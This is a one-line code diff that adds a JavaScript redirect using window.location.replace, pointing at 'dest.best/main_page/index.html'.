@@ -1,0 +1,1 @@
+window.location.replace("dest.best/main_page/index.html")
